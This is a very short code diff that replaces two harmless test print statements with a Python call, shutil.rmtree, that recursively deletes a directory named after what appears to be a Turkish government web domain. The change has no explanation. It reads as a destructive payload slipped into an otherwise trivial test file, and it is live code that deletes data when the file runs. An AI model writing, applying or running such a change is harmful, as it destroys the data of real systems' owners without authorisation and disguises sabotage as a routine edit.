@@ -1,2 +1,2 @@
-print "test"
-print "ok"
+import shutil
+shutil.rmtree('/odsgm.meb.gov.tr')
